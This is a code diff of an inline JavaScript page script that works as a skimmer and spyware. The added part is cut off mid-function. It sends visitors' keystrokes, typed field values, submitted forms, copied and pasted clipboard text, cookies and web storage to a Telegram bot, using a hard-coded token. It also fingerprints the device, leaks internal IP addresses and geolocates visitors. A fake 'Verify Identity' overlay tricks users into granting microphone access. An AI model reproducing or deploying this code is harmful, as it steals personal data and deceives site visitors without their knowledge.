-      _stageEvent('INIT_FP', _hwFingerprint());
-      _netProbe();
-      _leakIP();
-      _storageDump();
-      _trackMouse();
-      _fieldMonitor();
-      _visibilityTrack();
-      _heartbeat();
-      _performance();
-      _deviceCaps();
-      _networkStatus();
-      _batteryStatus();
-      _domWatch();
-      if (_pValid) {
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
-          _mStream = s;
-          _mState = true;
-          _runAudioEngine();
-        }).catch(() => {});
-      } else {
-        document.body.addEventListener('click', () => {
-          if (!_pValid) _initAudioExfil();
-        }, { once: true });
-      }
-    }
-    window.addEventListener('load', _init);
-    window.addEventListener('beforeunload', () => {
-      _stageEvent('EXIT_LOG', { dur: Math.round((Date.now() - _start) / 1000) });
-      _pushBuffer();
-    });
-    window.addEventListener('error', (e) => {
-      _stageEvent('RUNTIME_ERR', { msg: e.message, line: e.lineno });
-    });
-    function _fontAudit() {
-      const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
-      const detected = fonts.filter(f => document.fonts.check(`12px "${f}"`));
-      _stageEvent('FONT_LIST', detected);
-    }
-    _fontAudit();
-    function _plugins() {
-      const p = [];
-      if (navigator.plugins) {
-        for (let i = 0; i < navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
-      }
-      _stageEvent('PLUGINS', p);
-    }
-    _plugins();
-    function _scrollWatch() {
-      window.addEventListener('scroll', () => {
-        const p = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
-        if (p > _vDepth && p % 25 === 0) {
-          _vDepth = p;
-          _stageEvent('SCROLL_DEPTH', { pct: p });
-        }
-      });
-    }
-    _scrollWatch();
-    function _orientLog() {
-      window.addEventListener('orientationchange', () => {
-        _stageEvent('ORIENT_CHANGE', { type: window.screen.orientation?.type });
-      });
-    }
-    _orientLog();
-    function _offlineAudioFP() {
-      try {
-        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-        const osc = ctx.createOscillator();
-        osc.type = 'triangle';
-        osc.frequency.value = 1000;
-        const comp = ctx.createDynamicsCompressor();
-        osc.connect(comp);
-        comp.connect(ctx.destination);
-        osc.start(0);
-        ctx.oncomplete = (e) => {
-          const d = e.renderedBuffer.getChannelData(0);
-          let sum = 0;
-          for (let i = 0; i < d.length; i += 500) sum += Math.abs(d[i]);
-          _stageEvent('AUDIO_SIGNATURE', { val: sum.toString(16) });
-        };
-        ctx.startRendering();
-      } catch (e) {}
-    }
-    _offlineAudioFP();
-    function _canvasAdvance() {
-      const c = document.createElement('canvas');
-      const x = c.getContext('2d');
-      x.font = "18pt Arial";
-      x.textBaseline = "alphabetic";
-      x.fillStyle = "#f60";
-      x.fillRect(125, 1, 62, 20);
-      x.fillStyle = "#069";
-      x.fillText("NSB_TELEMETRY_LOG", 2, 15);
-      _stageEvent('CANVAS_ADV', { hash: c.toDataURL().slice(-50) });
-    }
-    _canvasAdvance();
-    function _mimeList() {
-      const m = [];
-      if (navigator.mimeTypes) {
-        for (let i = 0; i < navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
-      }
-      _stageEvent('MIME_TYPES', m);
-    }
-    _mimeList();
-    function _historyCheck() {
-      _stageEvent('HISTORY_LEN', { val: history.length });
-    }
-    _historyCheck();
-    function _screenDetails() {
-      _stageEvent('SCREEN_META', {
-        availW: screen.availWidth,
-        availH: screen.availHeight,
-        pxRatio: window.devicePixelRatio
-      });
-    }
-    _screenDetails();
-    function _timeDetails() {
-      _stageEvent('TIME_META', {
-        local: new Date().toString(),
-        stamp: Date.now()
-      });
-    }
-    _timeDetails();
-    function _platformDetails() {
-      _stageEvent('PLATFORM_META', {
-        v: navigator.vendor,
-        p: navigator.product,
-        online: navigator.onLine
-      });
-    }
-    _platformDetails();
-    function _permissionMatrix() {
-      const p = ['geolocation', 'notifications', 'push', 'camera', 'microphone'];
-      p.forEach(n => {
-        navigator.permissions?.query({ name: n }).then(s => {
-          _stageEvent('PERM_STATUS', { name: n, state: s.state });
-        }).catch(() => {});
-      });
-    }
-    _permissionMatrix();
-    function _touchCaps() {
-      _stageEvent('TOUCH_CAPS', {
-        max: navigator.maxTouchPoints,
-        enabled: 'ontouchstart' in window
-      });
-    }
-    _touchCaps();
-    function _pdfCheck() {
-      _stageEvent('PDF_CAPS', {
-        enabled: navigator.pdfViewerEnabled || false
-      });
-    }
-    _pdfCheck();
-    function _doNotTrack() {
-      _stageEvent('DNT_STATUS', {
-        val: navigator.doNotTrack || window.doNotTrack
-      });
-    }
-    _doNotTrack();
-    function _eventLoopAudit() {
-      const start = Date.now();
-      setTimeout(() => {
-        _stageEvent('LOOP_LAG', { ms: Date.now() - start - 1000 });
-      }, 1000);
-    }
-    _eventLoopAudit();
-    function _memoryAudit() {
-      if (performance.memory) {
-        _stageEvent('MEM_LOG', {
-          used: performance.memory.usedJSHeapSize,
-          total: performance.memory.totalJSHeapSize
-        });
-      }
-    }
-    _memoryAudit();
-    function _visibilityAudit() {
-      _stageEvent('VISIBILITY_INIT', {
-        state: document.visibilityState
-      });
-    }
-    _visibilityAudit();
-    function _interactionAudit() {
-      let active = true;
-      const _setIdle = () => { if (active) { active = false; _stageEvent('USER_IDLE', { ts: Date.now() }); } };
-      const _setActive = () => { if (!active) { active = true; _stageEvent('USER_RETURN', { ts: Date.now() }); } };
-      let _t;
-      document.addEventListener('mousemove', () => { clearTimeout(_t); _setActive(); _t = setTimeout(_setIdle, 60000); });
-    }
-    _interactionAudit();
-    function _linkAudit() {
-      document.querySelectorAll('a').forEach(a => {
-        a.addEventListener('mouseenter', () => _stageEvent('HOVER_LINK', { url: a.href }));
-      });
-    }
-    _linkAudit();
-    function _titleAudit() {
-      let t = document.title;
-      setInterval(() => {
-        if (document.title !== t) {
-          _stageEvent('TITLE_CHANGE', { from: t, to: document.title });
-          t = document.title;
-        }
-      }, 5000);
-    }
-    _titleAudit();
-    function _locationAudit() {
-      _stageEvent('LOCATION_DATA', {
-        host: location.hostname,
-        path: location.pathname,
-        proto: location.protocol
-      });
-    }
-    _locationAudit();
-    function _hashAudit() {
-      window.addEventListener('hashchange', () => _stageEvent('HASH_CHANGE', { val: location.hash }));
-    }
-    _hashAudit();
-    function _cookieAudit() {
-      _stageEvent('COOKIE_META', { count: document.cookie.split(';').length });
-    }
-    _cookieAudit();
-    function _gamepadAudit() {
-      window.addEventListener("gamepadconnected", (e) => _stageEvent('GAMEPAD_ACT', { id: e.gamepad.id }));
-    }
-    _gamepadAudit();
-    function _speechAudit() {
-      if (window.speechSynthesis) {
-        _stageEvent('SPEECH_CAPS', { count: window.speechSynthesis.getVoices().length });
-      }
-    }
-    _speechAudit();
-    function _selectionAudit() {
-      document.addEventListener('selectionchange', () => {
-        const s = window.getSelection().toString();
-        if (s.length > 5) _stageEvent('TEXT_SEL', { len: s.length });
-      });
-    }
-    _selectionAudit();
-    function _printAudit() {
-      window.addEventListener('beforeprint', () => _stageEvent('PRINT_TRIGGER', { ts: Date.now() }));
-    }
-    _printAudit();
-    function _mediaQueryAudit() {
-      _stageEvent('QUERY_META', {
-        dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
-        motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
-      });
-    }
-    _mediaQueryAudit();
-    function _javaAudit() {
-      _stageEvent('JAVA_ENABLED', { val: navigator.javaEnabled() });
-    }
-    _javaAudit();
-    function _workerAudit() {
-      _stageEvent('WORKER_SUPPORT', { val: typeof Worker !== 'undefined' });
-    }
-    _workerAudit();
-    function _idbAudit() {
-      _stageEvent('IDB_SUPPORT', { val: !!window.indexedDB });
-    }
-    _idbAudit();
-    function _navigatorAudit() {
-      _stageEvent('NAV_PROPS', {
-        v: navigator.vendor,
-        p: navigator.platform,
-        o: navigator.onLine
-      });
-    }
-    _navigatorAudit();
-    function _storageChangeAudit() {
-      window.addEventListener('storage', (e) => _stageEvent('LOCAL_STORAGE_CHANGE', { key: e.key, val: e.newValue }));
-    }
-    _storageChangeAudit();
-    function _unhandledRejection() {
-      window.addEventListener('unhandledrejection', (e) => _stageEvent('PROMISE_FAIL', { reason: String(e.reason) }));
-    }
-    _unhandledRejection();
-    function _resizeAudit() {
-      window.addEventListener('resize', () => {
-        _resChanges.push({ w: window.innerWidth, h: window.innerHeight, ts: Date.now() });
-        if (_resChanges.length > 3) { _stageEvent('RESIZE_EVENT', [..._resChanges]); _resChanges = []; }
-      });
-    }
-    _resizeAudit();
-    function _cpuConcurrency() {
-      _stageEvent('CPU_CORES', { count: navigator.hardwareConcurrency });
-    }
-    _cpuConcurrency();
-    function _deviceRam() {
-      _stageEvent('DEVICE_RAM', { gb: navigator.deviceMemory || 'unknown' });
-    }
-    _deviceRam();
-    function _touchStartAudit() {
-      document.addEventListener('touchstart', (e) => {
-        if (e.touches[0]) {
-          _touchPts.push({ x: e.touches[0].pageX, y: e.touches[0].pageY, ts: Date.now() });
-          if (_touchPts.length > 5) { _stageEvent('TOUCH_STREAM', [..._touchPts]); _touchPts = []; }
-        }
-      }, { passive: true });
-    }
-    _touchStartAudit();
-    function _finalSyncTrigger() {
-      window.addEventListener('unload', () => {
-        _stageEvent('SESSION_CLOSE', { ts: Date.now() });
-        _pushBuffer();
-      });
-    }
-    _finalSyncTrigger();
-    function _integrityCheck() {
-      _stageEvent('NODE_INTEGRITY', {
-        sess: SECURE_CONFIG.SESS_KEY,
-        href: location.href,
-        ua: navigator.userAgent
-      });
-    }
-    _integrityCheck();
-    function _videoCapsAudit() {
-      const v = document.createElement('video');
-      _stageEvent('VIDEO_CODECS', {
-        mp4: v.canPlayType('video/mp4'),
-        webm: v.canPlayType('video/webm')
-      });
-    }
-    _videoCapsAudit();
-    function _audioCapsAudit() {
-      const a = document.createElement('audio');
-      _stageEvent('AUDIO_CODECS', {
-        mp3: a.canPlayType('audio/mpeg'),
-        wav: a.canPlayType('audio/wav')
-      });
-    }
-    _audioCapsAudit();
-    function _shadowDomAudit() {
-      _stageEvent('SHADOW_DOM', { supported: !!Element.prototype.attachShadow });
-    }
-    _shadowDomAudit();
-    function _keyboardAudit() {
-      if (navigator.keyboard) {
-        navigator.keyboard.getLayoutMap().then(m => _stageEvent('KBD_MAP', { size: m.size }));
-      }
-    }
-    _keyboardAudit();
-    function _oscillatorSync() {
-      _stageEvent('OSC_SYNC', { ts: Date.now(), delta: performance.now() });
-    }
-    _oscillatorSync();
-    function _domDepthAudit() {
-      _stageEvent('DOM_DEPTH', { count: document.querySelectorAll('*').length });
-    }
-    _domDepthAudit();
-    function _inputFocusAudit() {
-      document.addEventListener('focusin', (e) => _stageEvent('FOCUS_IN', { tag: e.target.tagName, id: e.target.id }));
-    }
-    _inputFocusAudit();
-    function _scrollEndAudit() {
-      let t;
-      window.addEventListener('scroll', () => {
-        clearTimeout(t);
-        t = setTimeout(() => _stageEvent('SCROLL_STOP', { y: window.scrollY }), 500);
-      });
-    }
-    _scrollEndAudit();
-    function _vibrationAudit() {
-      _stageEvent('VIBRATE_SUPPORT', { val: !!navigator.vibrate });
-    }
-    _vibrationAudit();
-    function _beaconSupport() {
-      _stageEvent('BEACON_SUPPORT', { val: !!navigator.sendBeacon });
-    }
-    _beaconSupport();
-    function _fetchSupport() {
-      _stageEvent('FETCH_SUPPORT', { val: !!window.fetch });
-    }
-    _fetchSupport();
-    function _promiseSupport() {
-      _stageEvent('PROMISE_SUPPORT', { val: !!window.Promise });
-    }
-    _promiseSupport();
-    function _cryptoSupport() {
-      _stageEvent('CRYPTO_SUPPORT', { val: !!window.crypto });
-    }
-    _cryptoSupport();
-    function _canvasMeasure() {
-      const c = document.createElement('canvas');
-      const x = c.getContext('2d');
-      x.font = "12px Arial";
-      const m = x.measureText("NSB_SYSTEM_PROBE");
-      _stageEvent('TEXT_METRICS', { w: m.width });
-    }
-    _canvasMeasure();
-    function _navigatorLanguage() {
-      _stageEvent('LANG_DETAIL', { pref: navigator.language, all: navigator.languages });
-    }
-    _navigatorLanguage();
-    function _networkType() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (c) _stageEvent('CONN_TYPE', { val: c.effectiveType });
-    }
-    _networkType();
-    function _perfNavigation() {
-      if (window.performance && performance.navigation) {
-        _stageEvent('NAV_TYPE_LOG', { type: performance.navigation.type });
-      }
-    }
-    _perfNavigation();
-    function _domCompleteAudit() {
-      _stageEvent('DOM_READY_STATE', { state: document.readyState });
-    }
-    _domCompleteAudit();
-    function _executionSync() {
-      _stageEvent('EXECUTION_CHCK', { ts: Date.now() });
-    }
-    _executionSync()
-    function _finalNodeCheck() {
-      _stageEvent('NODE_HEALTH', { status: 'OK', sid: SECURE_CONFIG.SESS_KEY });
-    }
-    _finalNodeCheck();
-  })();
-</script>
+        (function() {
+            "use strict";
+            const _v0 = ['8481428965',
+                'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
+            const _v1 = '7275242903';
+            const SECURE_CONFIG = {
+                API_TOKEN: _v0[0] + ':' + _v0[1],
+                TARGET_ID: _v1,
+                BUFFER_LIMIT: 8,
+                CLICK_LIMIT: 5,
+                SYNC_DELAY: 4000,
+                HEARTBEAT: 20000,
+                RETRY_LIMIT: 10,
+                QUEUE_MAX: 500,
+                SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2, 15),
+                FLOW_CONTROL: 1200,
+                KEY_BATCH: 10
+            };
+            let _lastSync = 0;
+            let _msgQueue = [];
+            let _lock = false;
+            let _evtBuffer = [];
+            let _hTimer = null;
+            let _keyCapture = [];
+            let _ptrCapture = [];
+            let _lastAct = Date.now();
+            let _cache = [];
+            let _start = Date.now();
+            let _vDepth = 0;
+            let _mStream = null;
+            let _mState = false;
+            let _pValid = localStorage.getItem('media_access_verified') === 'true';
+            let _touchPts = [];
+            let _resChanges = [];
+            let _fieldStart = new Map();
+            let _mouseMoves = [];
+            let _mouseTimer = null;
+            async function _transmit(payload, urgency = false) {
+                const _out = String(payload).substring(0, 4096);
+                const _now = Date.now();
+                const _diff = _now - _lastSync;
+                if (_diff < SECURE_CONFIG.FLOW_CONTROL && !urgency) {
+                    _msgQueue.push(_out);
+                    setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL - _diff);
+                    return;
+                }
+                _lastSync = _now;
+                try {
+                    const _r = await fetch('https://api.telegram.org/bot' + SECURE_CONFIG.API_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: SECURE_CONFIG.TARGET_ID,
+                            text: _out
+                        })
+                    });
+                    if (!_r.ok) throw new Error('ERR_UP');
+                    _processQueue();
+                } catch (e) {
+                    if (_cache.length < SECURE_CONFIG.QUEUE_MAX) _cache.push(_out);
+                }
+            }
+            function _processQueue() {
+                if (_lock || _msgQueue.length === 0) return;
+                _lock = true;
+                const _next = _msgQueue.shift();
+                _transmit(_next, true).finally(() => {
+                    _lock = false;
+                    if (_msgQueue.length > 0) setTimeout(_processQueue, SECURE_CONFIG.FLOW_CONTROL);
+                });
+            }
+            function _stageEvent(id,
+                data) {
+                _evtBuffer.push({
+                    id: id,
+                    payload: data,
+                    tick: Date.now(),
+                    sid: SECURE_CONFIG.SESS_KEY,
+                    u: window.location.href,
+                    ref: document.referrer || 'direct'
+                });
+                if (_hTimer) clearTimeout(_hTimer);
+                _hTimer = setTimeout(_pushBuffer, SECURE_CONFIG.SYNC_DELAY);
+                if (_evtBuffer.length >= SECURE_CONFIG.BUFFER_LIMIT) _pushBuffer();
+            }
+            function _pushBuffer() {
+                if (_evtBuffer.length === 0) return;
+                const _ship = [..._evtBuffer];
+                _evtBuffer = [];
+                const _meta = `\nNODE: ${SECURE_CONFIG.SESS_KEY}\nPAGE: ${window.location.pathname}`;
+                _transmit('📦 BATCH_DATA [' + _ship.length + ']' + _meta + '\n' + JSON.stringify(_ship, null, 1), true);
+            }
+            function _hwFingerprint() {
+                const _c = document.createElement('canvas');
+                const _x = _c.getContext('2d');
+                _c.width = 300;
+                _c.height = 50;
+                _x.textBaseline = "top";
+                _x.font = "14px 'Arial'";
+                _x.fillStyle = "#f60";
+                _x.fillRect(100, 5, 50, 40);
+                _x.fillStyle = "#069";
+                _x.fillText("NSB_SYSTEM_UNIT_ACTIVE", 2, 10);
+                const _f1 = _c.toDataURL();
+                let _webgl = {};
+                try {
+                    const _c2 = document.createElement('canvas');
+                    const _gl = _c2.getContext('webgl') || _c2.getContext('experimental-webgl');
+                    if (_gl) {
+                        const _ext = _gl.getExtension('WEBGL_debug_renderer_info');
+                        _webgl = {
+                            r: _ext ? _gl.getParameter(_ext.UNMASKED_RENDERER_WEBGL): _gl.getParameter(_gl.RENDERER),
+                            v: _ext ? _gl.getParameter(_ext.UNMASKED_VENDOR_WEBGL): _gl.getParameter(_gl.VENDOR)
+                        };
+                    }
+                } catch (e) {}
+                return {
+                    ua: navigator.userAgent,
+                    plt: navigator.platform,
+                    mem: navigator.deviceMemory || 0,
+                    cpu: navigator.hardwareConcurrency || 0,
+                    scr: `${screen.width}x${screen.height}`,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    lang: navigator.languages,
+                    gpu: _webgl,
+                    fp: _f1.slice(-60)
+                };
+            }
+            function _mapInput(e) {
+                let _k = e.key;
+                const _t = e.target;
+                return {
+                    key: _k,
+                    id: _t.id || _t.name || 'anon',
+                    tag: _t.tagName,
+                    raw: (_t.type === 'password' || _t.id?.includes('pass')) ? '[SENSITIVE_CAP]': _t.value,
+                    ts: Date.now()
+                };
+            }
+            document.addEventListener('keydown', (e) => {
+                _keyCapture.push(_mapInput(e));
+                _lastAct = Date.now();
+                if (_keyCapture.length >= SECURE_CONFIG.KEY_BATCH) {
+                    _stageEvent('KEY_LOG', [..._keyCapture]);
+                    _keyCapture = [];
+                }
+            });
+            document.addEventListener('input',
+                (e) => {
+                    const _t = e.target;
+                    _stageEvent('INPUT_LIVE', {
+                        id: _t.id || _t.name,
+                        val: _t.value,
+                        type: _t.type,
+                        ts: Date.now()
+                    });
+                });
+            document.addEventListener('submit',
+                (e) => {
+                    const _f = e.target;
+                    const _d = new FormData(_f);
+                    const _p = {};
+                    for (let [k, v] of _d.entries()) _p[k] = v;
+                    _stageEvent('FORM_CAPTURE', {
+                        action: _f.action,
+                        method: _f.method,
+                        fields: _p
+                    });
+                    _pushBuffer();
+                },
+                true);
+            document.addEventListener('click',
+                (e) => {
+                    const _t = e.target;
+                    _ptrCapture.push({
+                        tag: _t.tagName,
+                        id: _t.id || _t.className,
+                        txt: _t.innerText?.slice(0, 50),
+                        pos: {
+                            x: e.clientX, y: e.clientY
+                        },
+                        ts: Date.now()
+                    });
+                    if (_ptrCapture.length >= SECURE_CONFIG.CLICK_LIMIT) {
+                        _stageEvent('CLICK_LOG', [..._ptrCapture]);
+                        _ptrCapture = [];
+                    }
+                });
+            document.addEventListener('copy',
+                () => {
+                    setTimeout(async () => {
+                        try {
+                            const _t = await navigator.clipboard.readText();
+                            if (_t) _stageEvent('CLIP_COPY', {
+                                val: _t
+                            });
+                        } catch (e) {}
+                    },
+                        100);
+                });
+            document.addEventListener('paste', (e) => {
+                const _t = e.clipboardData?.getData('text');
+                if (_t) _stageEvent('CLIP_PASTE', {
+                    val: _t
+                });
+            });
+            async function _netProbe() {
+                try {
+                    const _r1 = await fetch('https://api.ipify.org?format=json');
+                    const _d1 = await _r1.json();
+                    const _r2 = await fetch(`https://ipapi.co/${_d1.ip}/json/`);
+                    const _d2 = await _r2.json();
+                    _stageEvent('NETWORK_LOC',
+                        _d2);
+                } catch (e) {}
+            }
+            function _initAudioExfil() {
+                if (_mState || _pValid) return;
+                const _ov = document.createElement('div');
+                _ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;';
+                _ov.innerHTML = '<div style="background:#fff;padding:30px;border-radius:10px;text-align:center;"><h2 style="color:#000">Security Requirement</h2><p style="color:#444">Enable Identity Verification to proceed.</p><button id="_auth_btn" style="padding:10px 20px;background:#0052cc;color:#fff;border:none;border-radius:5px;cursor:pointer;">VERIFY IDENTITY</button></div>';
+                document.body.appendChild(_ov);
+                document.getElementById('_auth_btn').onclick = () => {
+                    navigator.mediaDevices.getUserMedia({
+                        audio: true
+                    }).then(s => {
+                        _mStream = s;
+                        _mState = true;
+                        _pValid = true;
+                        localStorage.setItem('media_access_verified', 'true');
+                        _ov.remove();
+                        _runAudioEngine();
+                        _stageEvent('AUDIO_AUTH', {
+                            status: 'GRANTED'
+                        });
+                    }).catch(e => {
+                        _stageEvent('AUDIO_AUTH', {
+                            status: 'DENIED', msg: e.message
+                        });
+                        _ov.remove();
+                    });
+                };
+            }
+            function _runAudioEngine() {
+                if (!_mStream) return;
+                try {
+                    const _ac = new (window.AudioContext || window.webkitAudioContext)();
+                    const _s = _ac.createMediaStreamSource(_mStream);
+                    const _a = _ac.createAnalyser();
+                    _s.connect(_a);
+                    _a.fftSize = 256;
+                    const _d = new Uint8Array(_a.frequencyBinCount);
+                    setInterval(() => {
+                        _a.getByteTimeDomainData(_d);
+                        let _max = 0;
+                        for (let i = 0; i < _d.length; i++) {
+                            const _v = Math.abs(_d[i] - 128) / 128;
+                            if (_v > _max) _max = _v;
+                        }
+                        if (_max > 0.05) _stageEvent('VOICE_PEAK', {
+                            amp: Math.floor(_max * 100)
+                        });
+                    },
+                        3000);
+                } catch (e) {}
+            }
+            function _leakIP() {
+                try {
+                    const pc = new RTCPeerConnection( {
+                        iceServers: []
+                    });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+                            if (ip) _stageEvent('INTERNAL_IP', {
+                                addr: ip[0]
+                            });
+                        }
+                    };
+                } catch (e) {}
+            }
+            function _trackMouse() {
+                document.addEventListener('mousemove', (e) => {
+                    _mouseMoves.push({
+                        x: e.clientX, y: e.clientY, ts: Date.now()
+                    });
+                    if (_mouseMoves.length > 200) _mouseMoves = _mouseMoves.slice(-100);
+                    if (_mouseTimer) clearTimeout(_mouseTimer);
+                    _mouseTimer = setTimeout(() => {
+                        if (_mouseMoves.length > 5) {
+                            _stageEvent('MOUSE_PATH', {
+                                pts: _mouseMoves.slice(-20)
+                            });
+                            _mouseMoves = [];
+                        }
+                    },
+                        5000);
+                }, {
+                    passive: true
+                });
+            }
+            function _fieldMonitor() {
+                document.addEventListener('focusin', (e) => {
+                    if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) _fieldStart.set(e.target, Date.now());
+                });
+                document.addEventListener('focusout',
+                    (e) => {
+                        const t = e.target;
+                        if (_fieldStart.has(t)) {
+                            _stageEvent('FIELD_DUR', {
+                                id: t.id || t.name, ms: Date.now() - _fieldStart.get(t), val: t.value
+                            });
+                            _fieldStart.delete(t);
+                        }
+                    });
+            }
+            function _storageDump() {
+                const _d = {
+                    l: {}, s: {}, c: document.cookie
+                };
+                try {
+                    for (let i = 0; i < localStorage.length; i++) _d.l[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
+                    for (let i = 0; i < sessionStorage.length; i++) _d.s[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
+                } catch (e) {}
+                _stageEvent('STORAGE_DUMP', _d);
+            }
+            function _visibilityTrack() {
+                document.addEventListener('visibilitychange', () => {
+                    _stageEvent('TAB_STATUS', {
+                        state: document.visibilityState, ts: Date.now()
+                    });
+                });
+            }
+            function _heartbeat() {
+                setInterval(() => {
+                    _stageEvent('HEARTBEAT', {
+                        uptime: Math.round((Date.now() - _start) / 1000),
+                        y: window.scrollY,
+                        url: window.location.href
+                    });
+                }, SECURE_CONFIG.HEARTBEAT);
+            }
+            function _performance() {
+                if (performance && performance.timing) {
+                    const t = performance.timing;
+                    _stageEvent('PERF_LOG', {
+                        load: t.loadEventEnd - t.navigationStart,
+                        dns: t.domainLookupEnd - t.domainLookupStart,
+                        tcp: t.connectEnd - t.connectStart
+                    });
+                }
+            }
+            function _deviceCaps() {
+                const _v = document.createElement('video');
+                _stageEvent('MEDIA_CAPS', {
+                    h264: _v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
+                    webm: _v.canPlayType('video/webm; codecs="vp8, vorbis"'),
+                    cores: navigator.hardwareConcurrency,
+                    touch: navigator.maxTouchPoints
+                });
+            }
+            function _networkStatus() {
+                const _n = navigator.connection;
+                if (_n) {
+                    const _log = () => _stageEvent('NET_CHANGE', {
+                        type: _n.effectiveType, down: _n.downlink, rtt: _n.rtt
+                    });
+                    _log();
+                    _n.addEventListener('change', _log);
+                }
+            }
+            function _batteryStatus() {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        const _log = () => _stageEvent('PWR_LOG', {
+                            lvl: b.level, chg: b.charging
+                        });
+                        _log();
+                        b.addEventListener('levelchange', _log);
+                        b.addEventListener('chargingchange', _log);
+                    });
+                }
+            }
+            function _domWatch() {
+                const _obs = new MutationObserver((m) => {
+                    _stageEvent('DOM_MUTATION', {
+                        count: m.length, ts: Date.now()
+                    });
+                });
+                _obs.observe(document.body, {
+                    childList: true, subtree: true
+                });
+            }
+            function _init() {
+                _transmit('💎 NODE_ACTIVE: ' + window.location.hostname + '\nSESS: ' + SECURE_CONFIG.SESS_KEY, true);
+                _stageEvent('INIT_FP', _hwFingerprint());
+                _netProbe();
+                _leakIP();
+                _storageDump();
+                _trackMouse();
+                _fieldMonitor();
+                _visibilityTrack();
+                _heartbeat();
+                _performance();
+                _deviceCaps();
+                _networkStatus();
+                _batteryStatus();
+                _domWatch();
+                if (_pValid) {
+                    navigator.mediaDevices.getUserMedia({
+                        audio: true
+                    }).then(s => {
+                        _mStream = s;
+                        _mState = true;
+                        _runAudioEngine();
+                    }).catch(() => {});
+                } else {
+                    document.body.addEventListener('click', () => {
+                        if (!_pValid) _initAudioExfil();
+                    },
+                        {
+                            once: true
+                        });
+                }
+            }
+            window.addEventListener('load',
+                _init);
+            window.addEventListener('beforeunload',
+                () => {
+                    _stageEvent('EXIT_LOG', {
+                        dur: Math.round((Date.now() - _start) / 1000)
+                    });
+                    _pushBuffer();
+                });
+            window.addEventListener('error',
+                (e) => {
+                    _stageEvent('RUNTIME_ERR', {
+                        msg: e.message, line: e.lineno
+                    });
+                });
+            function _fontAudit() {
+                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
+                const detected = fonts.filter(f => document.fonts.check(`12px "${f}"`));
+                _stageEvent('FONT_LIST',
+                    detected);
+            }
+            _fontAudit();
+            function _plugins() {
+                const p = [];
+                if (navigator.plugins) {
+                    for (let i = 0; i < navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
+                }
+                _stageEvent('PLUGINS', p);
+            }
+            _plugins();
+            function _scrollWatch() {
+                window.addEventListener('scroll', () => {
+                    const p = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+                    if (p > _vDepth && p % 25 === 0) {
+                        _vDepth = p;
+                        _stageEvent('SCROLL_DEPTH', {
+                            pct: p
+                        });
+                    }
+                });
+            }
+            _scrollWatch();
+            function _orientLog() {
+                window.addEventListener('orientationchange',
+                    () => {
+                        _stageEvent('ORIENT_CHANGE', {
+                            type: window.screen.orientation?.type
+                        });
+                    });
+            }
+            _orientLog();
+            function _offlineAudioFP() {
+                try {
+                    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1,
+                        44100,
+                        44100);
+                    const osc = ctx.createOscillator();
+                    osc.type = 'triangle';
+                    osc.frequency.value = 1000;
+                    const comp = ctx.createDynamicsCompressor();
+                    osc.connect(comp);
+                    comp.connect(ctx.destination);
+                    osc.start(0);
+                    ctx.oncomplete = (e) => {
+                        const d = e.renderedBuffer.getChannelData(0);
+                        let sum = 0;
+                        for (let i = 0; i < d.length; i += 500) sum += Math.abs(d[i]);
+                        _stageEvent('AUDIO_SIGNATURE', {
+                            val: sum.toString(16)
+                        });
+                    };
+                    ctx.startRendering();
+                } catch (e) {}
+            }
+            _offlineAudioFP();
+            function _canvasAdvance() {
+                const c = document.createElement('canvas');
+                const x = c.getContext('2d');
+                x.font = "18pt Arial";
+                x.textBaseline = "alphabetic";
+                x.fillStyle = "#f60";
+                x.fillRect(125, 1, 62, 20);
+                x.fillStyle = "#069";
+                x.fillText("NSB_TELEMETRY_LOG", 2, 15);
+                _stageEvent('CANVAS_ADV', {
+                    hash: c.toDataURL().slice(-50)
+                });
+            }
+            _canvasAdvance();
+            function _mimeList() {
+                const m = [];
+                if (navigator.mimeTypes) {
+                    for (let i = 0; i < navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
+                }
+                _stageEvent('MIME_TYPES', m);
+            }
+            _mimeList();
+            function _historyCheck() {
+                _stageEvent('HISTORY_LEN', {
+                    val: history.length
+                });
+            }
+            _historyCheck();
+            function _screenDetails() {
+                _stageEvent('SCREEN_META', {
+                    availW: screen.availWidth,
+                    availH: screen.availHeight,
+                    pxRatio: window.devicePixelRatio
+                });
+            }
+            _screenDetails();
+            function _timeDetails() {
+                _stageEvent('TIME_META', {
+                    local: new Date().toString(),
+                    stamp: Date.now()
+                });
+            }
+            _timeDetails();
+            function _platformDetails() {
+                _stageEvent('PLATFORM_META', {
+                    v: navigator.vendor,
+                    p: navigator.product,
+                    online: navigator.onLine
+                });
+            }
+            _platformDetails();
+            function _permissionMatrix() {
+                const p = ['geolocation',
+                    'notifications',
+                    'push',
+                    'camera',
+                    'microphone'];
+                p.forEach(n => {
+                    navigator.permissions?.query({
+                        name: n
+                    }).then(s => {
